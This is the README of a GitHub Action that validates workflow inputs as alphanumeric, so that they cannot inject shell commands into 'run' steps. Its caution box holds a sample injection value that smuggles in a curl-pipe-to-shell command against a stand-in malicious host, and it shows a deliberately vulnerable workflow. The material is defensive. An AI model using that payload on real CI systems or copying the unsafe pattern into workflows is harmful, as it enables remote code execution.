# validate-inputs-action


> [!CAUTION]
> Using run commands in github actions like `- run: echo "Hello ${{ input.name }}"` is not safe.
> It allows for any user with write access to run arbitrary scripts.
> If someone can inject a script like: `John"; curl https://malicious-script.com/script.sh | sh`, and that can runs in your CI!

What is not safe:
```yaml
on:
  workflow_dispatch:
    inputs:
      name:
        required: true
        # defaults to a string input

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      # allows for script inject!
      - run: echo "Hello ${{ input.name }}"
```

Errors on invalid inputs to github actions.

```yaml
on:
  workflow_dispatch:
    inputs:
      name:
        required: true
        # defaults to a string input

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      # errors if name is not alphanumeric
      - uses: jordanst3wart/validate-inputs-action@173efa2db92da9c23f49d84035f0d5b757811f82
        with:
          value: ${{ inputs.name }}
      # safe to call with run commands, shell commands can normally be injected here
      - run: echo "Hello ${{ input.name }}"
```

